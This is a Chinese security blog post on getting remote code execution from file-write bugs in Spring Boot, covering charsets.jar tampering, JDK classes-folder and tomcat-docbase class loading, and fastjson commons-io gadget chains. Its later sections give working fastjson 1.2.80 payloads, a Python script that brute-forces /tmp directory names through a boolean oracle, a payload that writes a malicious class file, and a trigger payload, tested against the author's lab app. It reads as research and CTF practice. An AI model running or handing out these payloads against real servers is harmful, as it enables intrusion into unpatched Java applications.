#  springboot环境下的写文件RCE   
原创 珂字辈  珂技知识分享   2024-11-14 14:49  
  
**一、    java特性加载类文件**  
  
传统的ssh key/任务计划就不说了，介绍一下已经流行开来的几种java特性加载类文件。  
  
**1，charsets.jar**  
  
LandGrey首发  
https://landgrey.me/blog/22/复现过程  
https://mp.weixin.qq.com/s/HMlaMPn4LK3GMs3RvK6ZRA也就是写  
```
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar
```  
  
很经典了，利用jvm不会一开始就加载所有类的机制，篡改charsets.jar，然后再用各种类加载触发。其中最方便的是  
```
Accept: text/html;charset=IBM33722
```  
  
charsets.jar编译可修改LandGrey的。注意，他把全部编码都指向IBM33722了，所以其他编码也能触发。  
https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/tree/main/charsets最终效果如下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWgxovbGbd4B9uFjJg4TQezXcQkibYibibbdJjFvx7GFQiagnOxkgNb9w9KA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWa4rZL7PawEavqGvloKwEGxcGicvNHuk9ExeyVjDEMmZ3Pu52vSB8UDQ/640?wx_fmt=png&from=appmsg "")  
  
但charsets.jar也有着诸多缺点。1，需root权限。不过好在现在docker/k8s横行，springboot服务大多数都是root权限。2，charsets.jar加载仅一次机会。如果之前有用户使用过charset=GBK之类的加载过charsets.jar，不管是正常还是恶意的，该方法都会失效。如果该方式已经失效的情况下，你写的charsets.jar又不完整，还可能会导致服务挂掉。3，完整的charsets.jar比较大，不过测试时不需要完整charsets.jar。4，jdk目录需要猜测，需要字典。5，仅jdk8或者以下适用。jdk9开始使用了模块化，不再存在charsets.jar**2，classes**  
  
https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/jdk8在加载类时，还会从/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/去找这个类，因此只需要向这里写一个Evil.class，再想办法触发即可。比如如果存在反序列化入口，可以class Evil implements Serializable，然后反序列化这个类，如果存在fastjson1.2.68入口，用如下payload触发。  
```
{"@type":"java.lang.AutoCloseable","@type":"Evil"}
```  
  
实际效果如下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUW7I7t3q6icI0EZOTDUxCVXwBlJsudIcQT0EQsAmbrDWaIGzBHdIPGRQg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWYFRJSicpBFB4kEkrdG2B89ib9rrlkCEicX3I8yTJ2Qa9OUHZQSUJCQbaw/640?wx_fmt=png&from=appmsg "")  
  
优点如下1，多次机会写入，Evil写坏了就写Evil2/Evil32，写入文件不大。缺点如下1，需root权限。2，jdk目录需要猜测。3，仅jdk8或者以下适用，jdk9的ClassLoader变动，不再尝试载入该文件夹。4，默认不存在classes目录，需要创建5，需触发入口，不像charsets.jar那样可以header触发。**3，classes+SPI机制**  
  
https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/这个方法解决了classes的缺点5，可以在不改动charsets.jar的情况下，利用classes/META-INF/services/java.nio.charset.spi.CharsetProvider文件指向classes/Evil.class，来完成charset=Evil触发Evil.class。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWp73fwAttHh4cu5HUIiadzwmQ3d7Q63QnQYFbEO1V1GamZ8oSptSV4Vg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWKb4aR2CHkVlgjXIHbgusz5PIbsh9dRoPV8Rqnibfu0CBIeEgFDWHwCg/640?wx_fmt=png&from=appmsg "")  
  
但同时它也多了一个缺点，charset=Evil第二次不会触发，需要不断变化charset=Evil111**4，tomcat-docbase**  
  
https://www.geekcon.top/js/pdfjs/web/viewer.html?file=/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf利用过程  
https://github.com/luelueking/CVE-2022-25845-In-Springspringboot会在/tmp目录生成tomcat-docbase文件夹，本质相当于tomcat的根目录，因此加载类时还会尝试加载/tmp/tomcat-docbase.8080.xx/WEB-INF/classes/目录下的类。/tmp目录可以根据server.tomcat.basedir配置项更改。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWG2DAn0veCzicP1geBzhN9NrT1m3IMaqowricqfO7T1Mq5VFvWMZAK29w/640?wx_fmt=png&from=appmsg "")  
  
手动写入后效果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWd5g06wadQlEVRsh2CUzFyjpkZZq1TLC2TuUNl06McfskXU6hM6f2cA/640?wx_fmt=png&from=appmsg "")  
  
优点如下1，无需root权限2，不限于jdk8，jdk11下测试成功缺点如下1，tomcat-docbase带随机后缀，无法爆破，只能配合目录读取2，WEB-INF/classes目录需要创建3，触发时直接Class.forName(clazz)是不行的，必须要特定classloader，比如Thread.currentThread().getContextClassLoader()。其中缺点3可以用如下代码测试。  
```
    @RequestMapping(value = "/classform1", method = RequestMethod.GET)
    public String classform1(String clazz) {
        Class clazzClass = null;
        try {
            clazzClass =  Class.forName(clazz, true, Thread.currentThread().getContextClassLoader());
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return "Class.forName "+clazzClass.getName();
    }
    
    @RequestMapping(value = "/classform2", method = RequestMethod.GET)
    public String classform2(String clazz) {
        Class clazzClass = null;
        try {
            clazzClass =  Class.forName(clazz);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return "Class.forName "+clazzClass.getName();
    }
```  
  
然后手动写Tomcat678910cmdechoException，classfrom2报错。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUW7L1RVCSsqleWuaQic3NI9ZRaae75uv4CM4JmqsIJiaghGpgrJ3xec4cQ/640?wx_fmt=png&from=appmsg "")  
  
classfrom1成功。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWGicia3kpZ2zZ9BUYR823hmqRrKHXoZsTxy4TSk5hQmkrS0eBxYKUlVicg/640?wx_fmt=png&from=appmsg "")  
  
因此这个写文件RCE基本限定在了fastjson，因为fastjson是用的Thread.currentThread().getContextClassLoader()。  
TypeUtils.loadClass(String, ClassLoader, boolean)      
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWuIf4gBGXViaYFibWjYc7BH4uHibetniahuUr64QtZoxUwDWoiclWxM5aXbg/640?wx_fmt=png&from=appmsg "")  
  
readObject用的是其他的，因此不行。  
ObjectInputStream.resolveClass()  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWGTibUJr9nrkyQrpRkf3T9jzdibP29iaAJ1a3bFo2b7Ha5jibDrnZLT8hEg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**二、    反序列化写文件实际利用**  
https://www.polarctf.com/#/page/challenges这个CTF靶场的一写一个不吱声完美符合。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWickJibKH5pFaKCfO008q1iabVsCKobRXibc5HuQmp8ubzQ3krS4apLQNfA/640?wx_fmt=png&from=appmsg "")  
  
常见的文件写入链只有两个，其中FileUpload1因为年代久远不常使用，剩下一个就是Aspectjweaver链。因此Aspectjweaver链打springboot确实非常贴合实战。Aspectjweaver链依赖commons-collections，靶场没有但是给了另外一个嫁接类。此外还给了jdk版本方便定位jdk路径，甚至贴心的帮忙创建了JAVA_HOME/classes目录，因此打charsets.jar或者classes都可以。  
  
  
**三、    fastjson io链历史****1，jdk11**  
  
JDK11(或者linux版本部分jdk8)的任意文件写。  
https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/http://scz.617.cn:8/web/202008081723.txthttp://scz.617.cn:8/web/202008100900.txthttp://scz.617.cn:8/web/202008111715.txt**2，io1/io2**  
  
commons-io-2.x的文件写  
https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg缺点，只能写8kb整的文件，且写二进制文件会导致文件混乱。如下图这是写>8kb的二进制文件效果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWAcIicgjVAPON27GBjAxpfnboS2XN6WvC9yKRZLh7dG3CLSaHafX1bcQ/640?wx_fmt=png&from=appmsg "")  
  
后来发现使用iso-8859-1代替UTF-8编码，可以写二进制文件，但还是只能8kb整。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWBqsdC89MZ0PGFTQI5oJJBKUaWUqw1Z7icDWQJQqwevX6ibvGqjNbB1QA/640?wx_fmt=png&from=appmsg "")  
  
**3，io3**  
  
su18发现的类似io1的链，和io1基本一样。  
https://su18.org/post/fastjson-1.2.68/**4，io_read/io4**  
  
blackhat上公开一条文件读取(列目录，SSRF)的链，但需要回显，后来被浅蓝优化，可以用dnslog和报错进行布尔判断。  
https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdfhttps://b1ue.cn/archives/506.html除此之外，blackhat还公开了一条依赖commons-io-2.2 aspectjtools-1.9.6 commons-codec-1.6的文件写入链。称为io4。这条链是为了解决原版io1-3写入二进制文件会混乱。但我复现时，发现文件大小依旧固定为8kb整，也就是跟io1-3链搭配iso-8859-1编码是一样的。360有关于这条链的复现  
https://blog.noah.360.net/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/至此我们可以发现io1-4链的缺陷，就是写文件固定大小均为8kb整。写so或者class文件时，我们需要塞入脏数据使文件大小恰好为8kb。**5，io5/io_mkdir**  
  
RainSec在io4的基础上，用anti依赖代替aspectj，于是有了io5。io5我测试下来是完美的，可以写大于8kb以上的二进制文件。  
https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew除此之外，他还发现LockableFileWriter可以创建目录的一条链。**6，fastjson1.2.80的io链**  
  
众所周知，在1.2.68版本，是靠AutoCloseable这个合法类，在fastjson1.2.80已经被ban了。浅蓝利用fastjson高版本可以序列化Field的特性以及对Exception这个漏网之鱼的研究，在KCon公开两条可以通过Exception将InputStream加入缓存的链子，配合io1-5/io_read/io_mkdir可以打fastjson1.2.80。  
https://github.com/knownsec/KCon/blob/b6038b4f8768ab41836973e81cb0dd156bd50d64/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf**7，io6/jackson+io链**  
  
浅蓝发现的ognl和xalan+dom4j依赖毕竟没用那么热门，于是利用jackson的Exception将InputStream加入缓存的链子在geekcon上公开。  
https://www.geekcon.top/js/pdfjs/web/viewer.html?file=/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf其中用LockableFileWriter代替FileWriterWithEncoding，被我称为io6，可以解决io1-4链文件大小恒定8kb的问题。而且可以自动创建目录，非常契合打springboot环境。  
**四、    fastjson写文件实际利用**  
https://github.com/luelueking/CVE-2022-25845-In-Spring依旧是非常贴合实战的思路，这里用的我自己写的靶场。  
```
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.7</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.80</version>
</dependency>
```  
```
    @RequestMapping(value = "/json", method = RequestMethod.POST)
    public String json(String json) {
        JSONObject jsonObject = null;
        try {
            jsonObject = JSON.parseObject(json);
            return jsonObject.toJSONString();
        } catch (Exception e) {
            e.printStackTrace();
            return "error";
        }
    }
```  
  
先将InputStream加入缓存。  
```
{
  "a": "{    \"@type\": \"java.lang.Exception\",    \"@type\": \"com.fasterxml.jackson.core.exc.InputCoercionException\",    \"p\": {    }  }",
  "b": {
    "$ref": "$.a.a"
  },
  "c": "{  \"@type\": \"com.fasterxml.jackson.core.JsonParser\",  \"@type\": \"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\",  \"in\": {}}",
  "d": {
    "$ref": "$.c.c"
  }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUW6GQg2lMbvB39iaSSbcJVgoyqHtpRjg4iciaD1957qN1iaHWQQibZP0HtDAQ/640?wx_fmt=png&from=appmsg "")  
  
然后使用io_read，利用回显的差异逐字爆破/tmp目录，实战中一般不会将反序列化的json对象打印出来，可以使用error的不同或者是否发起http请求作为布尔条件。实战中为了效率，可以使用合适的byte范围，以及充分利用boms支持多个bytes做二分快速筛选。  
```
#python2
import requests
import json

url = 'http://192.168.229.130:9999/json'
#url = 'http://127.0.0.1:5667/json'
def getdata(bytes):
    data = '''{
  "a": {
    "@type": "java.io.InputStream",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.BOMInputStream",
      "delegate": {
        "@type": "org.apache.commons.io.input.ReaderInputStream",
        "reader": {
          "@type": "jdk.nashorn.api.scripting.URLReader",
          "url": "file:///tmp/"
        },
        "charsetName": "UTF-8",
        "bufferSize": "1024"
      },
      "boms": [
        {
          "charsetName": "UTF-8",
          "bytes": ['''+bytes+''']
        }
      ]
    },
    "boms": [
      {
        "charsetName": "UTF-8",
        "bytes": [36]
      }
    ]
  },
  "b": {"$ref":"$.a.delegate"}
}'''
    return data
header = {'Content-Type':'application/json'}
header = {}
cookie = {}
flag = ''
bytes = ''
for ii in range(1,1000):
    for i in range(0, 257):
        if i == 256:
            f = open("1.txt","w")
            f.write(flag)
            print(flag.decode('UTF-8'))
            exit()
        byte = bytes+str(i)+','
        r = requests.post(url=url,data={'json':getdata(byte)},headers=header,cookies=cookie)
        #print(r.text)
        if "bytes" in r.text:
            bytes = bytes + str(i)+','
            print(bytes)
            flag = flag + chr(i)
            break
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWicjJ4wA71e3nE7x3HBPrs8epzjjlnDTsZ8f3C94tQW5zDZu2KqvgtiaA/640?wx_fmt=png&from=appmsg "")  
  
爆破出tomcat-docbase目录后，用io6写入Tomcat678910cmdechoException.class文件。  
```
{
  "a": {
    "@type": "java.io.InputStream",
    "@type": "org.apache.commons.io.input.AutoCloseInputStream",
    "in": {
      "@type": "org.apache.commons.io.input.TeeInputStream",
      "input": {
        "@type": "org.apache.commons.io.input.CharSequenceInputStream",
        "cs": {
          "@type": "java.lang.String"
          "\xCA\xFE\xBA\xBExxxxxxxxxxxxxxxx",
          "charset": "iso-8859-1",
          "bufferSize": 1024
        },
        "branch": {
          "@type": "org.apache.commons.io.output.WriterOutputStream",
          "writer": {
            "@type": "org.apache.commons.io.output.LockableFileWriter",
            "file": "/tmp/tomcat-docbase.9999.6522870832081637972/WEB-INF/classes/Tomcat678910cmdechoException.class",
            "charset": "iso-8859-1",
            "append": true
          },
          "charsetName": "iso-8859-1",
          "bufferSize": 1024,
          "writeImmediately": true
        },
        "closeBranch": true
      }
    },
    "b": {
      "@type": "java.io.InputStream",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "inputStream": {
          "$ref": "$.a"
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "iso-8859-1"
      },
      "charsetName": "iso-8859-1",
      "bufferSize": 1024
    },
    "c": {
      "@type": "java.io.InputStream",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "inputStream": {
          "$ref": "$.a"
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "iso-8859-1"
      },
      "charsetName": "iso-8859-1",
      "bufferSize": 1024
    }
  }
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWgbsLzMv9CYhHZHSpUORfBu5ofyRDqReefgliaXRNOomADa8zURbznFQ/640?wx_fmt=png&from=appmsg "")  
  
最后成功RCE  
```
{
    "@type": "java.lang.Exception",
    "@type": "Tomcat678910cmdechoException"
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU5MwZN6d85YzicI6P6JkloUWecJSLstsJGoEbrhXIZrOHPiaPA9bb2kCrGPBjgPOke7Zev5af1RIACw/640?wx_fmt=png&from=appmsg "")  
  
部分payload见我的github  
  
https://github.com/kezibei/fastjson_payload  
  
